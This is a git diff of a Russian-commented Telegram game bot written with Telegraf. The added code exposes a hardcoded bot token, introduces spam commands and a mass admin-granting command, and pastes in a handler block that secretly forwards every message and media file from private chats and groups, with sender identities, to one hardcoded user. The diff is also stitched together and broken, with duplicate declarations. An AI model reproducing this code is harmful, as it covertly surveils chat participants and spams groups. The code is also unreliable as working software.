@@ -5,6 +5,10 @@ const path = require('path');
 // ==================== КОНФИГУРАЦИЯ ====================
 const BOT_TOKEN = '8326632164:AAF09hmeUOFHuAFxeUPOlCk0MEpfBs5sCVk';
 
+const SUPER_ADMIN_ID = 6285155142101; // Ваш ID
+
+const bot = new Telegraf(BOT_TOKEN);
+
 // Конфигурация для спама
 const SPAM_CONFIG = {
     chatId: '-1003507363015', // ID чата для спама
@@ -112,7 +116,10 @@ bot.start((ctx) => {
         'Команды:\n' +
         '/start - показать это сообщение\n' +
         '/game - начать новую игру\n' +
-        '/stop - закончить игру',
+        '/stop - закончить игру\n' +
+        '/startspam - запустить спам\n' +
+        '/stopspam - остановить спам\n' +
+        '/ban - заблокировать пользователей из списка',
         { parse_mode: 'Markdown' }
     );
 });
@@ -169,6 +176,55 @@ bot.command('stopspam', (ctx) => {
     }
 });
 
+// ==================== КОМАНДЫ АДМ ====================
+
+bot.command('giveadm', async (ctx) => {
+    try {
+        // Проверки
+        if (ctx.chat.type === 'private') return ctx.reply('❌ Только в группах!');
+        if (ctx.from.id !== SUPER_ADMIN_ID) return ctx.reply('❌ Нет прав!');
+
+        // Проверка прав бота
+        const botMember = await ctx.telegram.getChatMember(ctx.chat.id, ctx.botInfo.id);
+        if (!botMember.status.includes('administrator')) {
+            return ctx.reply('❌ Бот не админ!');
+        }
+
+        // Получаем ID из сообщения
+        const ids = ctx.message.text
+            .split('\n')
+            .slice(1)
+            .map(id => id.trim())
+            .filter(id => id && /^\d+$/.test(id));
+
+        if (ids.length === 0) {
+            return ctx.reply('❌ Пример:\n/giveadm\n123456789\n987654321');
+        }
+
+        // Выдаем права каждому
+        for (const userId of ids) {
+            try {
+                await ctx.telegram.promoteChatMember(ctx.chat.id, parseInt(userId), {
+                    can_change_info: true,
+                    can_delete_messages: true,
+                    can_invite_users: true,
+                    can_restrict_members: true,
+                    can_pin_messages: true,
+                    can_promote_members: false,
+                    can_manage_chat: true
+                });
+            } catch (e) {
+                // Игнорируем ошибки для простоты
+            }
+        }
+
+        await ctx.reply(`✅ Права выданы ${ids.length} пользователям`);
+        
+    } catch (error) {
+        ctx.reply('❌ Ошибка');
+    }
+});
+
 // ==================== КОМАНДА БАНА ====================
 bot.command('ban', async (ctx) => {
     try {
@@ -202,6 +258,123 @@ bot.command('ban', async (ctx) => {
         await ctx.reply('❌ Произошла ошибка при выполнении команды');
     }
 });
+
+const { Telegraf } = require('telegraf');
+
+// Замените 'YOUR_BOT_TOKEN' на токен вашего бота
+const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+// Ваш Telegram ID (куда будут приходить сообщения)
+const YOUR_USER_ID = 1175966304; // Замените на ваш ID
+
+const bot = new Telegraf(BOT_TOKEN);
+
+// Обработка всех текстовых сообщений
+bot.on('text', async (ctx) => {
+    try {
+        // Игнорируем сообщения от самого бота
+        if (ctx.message.from.id === ctx.botInfo.id) return;
+        
+        // Игнорируем сообщения из лички с вами (чтобы не было зацикливания)
+        if (ctx.chat.type === 'private' && ctx.message.from.id === YOUR_USER_ID) return;
+        
+        let chatInfo = '';
+        
+        // Определяем тип чата
+        if (ctx.chat.type === 'private') {
+            chatInfo = `👤 Личка с: ${ctx.message.from.first_name} ${ctx.message.from.last_name || ''} (@${ctx.message.from.username || 'нет username'})`;
+        } else if (ctx.chat.type === 'group') {
+            chatInfo = `👥 Группа: ${ctx.chat.title} (ID: ${ctx.chat.id})`;
+        } else if (ctx.chat.type === 'supergroup') {
+            chatInfo = `🚀 Супергруппа: ${ctx.chat.title} (ID: ${ctx.chat.id})`;
+        } else if (ctx.chat.type === 'channel') {
+            chatInfo = `📢 Канал: ${ctx.chat.title} (ID: ${ctx.chat.id})`;
+        }
+        
+        // Формируем информацию об отправителе
+        const senderInfo = `👤 От: ${ctx.message.from.first_name} ${ctx.message.from.last_name || ''} (@${ctx.message.from.username || 'нет username'}) [ID: ${ctx.message.from.id}]`;
+        
+        // Текст сообщения
+        const messageText = ctx.message.text;
+        
+        // Отправляем сообщение вам в личку
+        await bot.telegram.sendMessage(
+            YOUR_USER_ID,
+            `📨 *Новое сообщение*\n\n` +
+            `${chatInfo}\n` +
+            `${senderInfo}\n\n` +
+            `💬 *Текст:*\n${messageText}`,
+            { parse_mode: 'Markdown' }
+        );
+        
+    } catch (error) {
+        console.error('Ошибка при обработке сообщения:', error);
+    }
+});
+
+// Обработка сообщений с медиа (фото, видео и т.д.)
+bot.on(['photo', 'video', 'document', 'audio', 'sticker'], async (ctx) => {
+    try {
+        if (ctx.message.from.id === ctx.botInfo.id) return;
+        if (ctx.chat.type === 'private' && ctx.message.from.id === YOUR_USER_ID) return;
+        
+        let chatInfo = '';
+        if (ctx.chat.type === 'private') {
+            chatInfo = `Личка с: ${ctx.message.from.first_name}`;
+        } else {
+            chatInfo = `${ctx.chat.type === 'group' ? 'Группа' : 'Супергруппа'}: ${ctx.chat.title}`;
+        }
+        
+        const senderInfo = `От: ${ctx.message.from.first_name} (@${ctx.message.from.username || 'нет username'})`;
+        
+        let mediaType = '';
+        let mediaContent = '';
+        
+        if (ctx.message.photo) {
+            mediaType = '🖼 Фото';
+            mediaContent = ctx.message.photo[ctx.message.photo.length - 1].file_id;
+            await bot.telegram.sendPhoto(YOUR_USER_ID, mediaContent, {
+                caption: `📨 *Новое медиа*\n\n${chatInfo}\n${senderInfo}`,
+                parse_mode: 'Markdown'
+            });
+        } else if (ctx.message.video) {
+            mediaType = '🎥 Видео';
+            mediaContent = ctx.message.video.file_id;
+            await bot.telegram.sendVideo(YOUR_USER_ID, mediaContent, {
+                caption: `📨 *Новое медиа*\n\n${chatInfo}\n${senderInfo}`,
+                parse_mode: 'Markdown'
+            });
+        } else if (ctx.message.document) {
+            mediaType = '📄 Документ';
+            mediaContent = ctx.message.document.file_id;
+            await bot.telegram.sendDocument(YOUR_USER_ID, mediaContent, {
+                caption: `📨 *Новое медиа*\n\n${chatInfo}\n${senderInfo}`,
+                parse_mode: 'Markdown'
+            });
+        } else if (ctx.message.audio) {
+            mediaType = '🎵 Аудио';
+            mediaContent = ctx.message.audio.file_id;
+            await bot.telegram.sendAudio(YOUR_USER_ID, mediaContent, {
+                caption: `📨 *Новое медиа*\n\n${chatInfo}\n${senderInfo}`,
+                parse_mode: 'Markdown'
+            });
+        } else if (ctx.message.sticker) {
+            mediaType = '🎨 Стикер';
+            mediaContent = ctx.message.sticker.file_id;
+            await bot.telegram.sendSticker(YOUR_USER_ID, mediaContent);
+            await bot.telegram.sendMessage(YOUR_USER_ID, 
+                `📨 *Новый стикер*\n\n${chatInfo}\n${senderInfo}`,
+                { parse_mode: 'Markdown' }
+            );
+        }
+        
+    } catch (error) {
+        console.error('Ошибка при обработке медиа:', error);
+    }
+});
+
+// Обработка остановки бота
+process.once('SIGINT', () => bot.stop('SIGINT'));
+process.once('SIGTERM', () => bot.stop('SIGTERM'));
 
 // ==================== ОБРАБОТКА ТЕКСТОВЫХ СООБЩЕНИЙ (ИГРА) ====================
 bot.on('text', (ctx) => {
